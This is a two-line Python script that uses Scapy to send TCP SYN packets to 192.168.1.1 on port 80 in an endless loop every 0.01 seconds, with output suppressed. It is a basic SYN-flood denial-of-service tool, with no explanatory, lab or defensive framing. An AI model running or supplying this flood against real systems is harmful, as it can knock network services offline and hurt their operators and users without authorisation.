from scapy.all import *
send(IP(dst="192.168.1.1")/TCP(dport=80,flags='S'),inter=0.01,loop=1,verbose=False)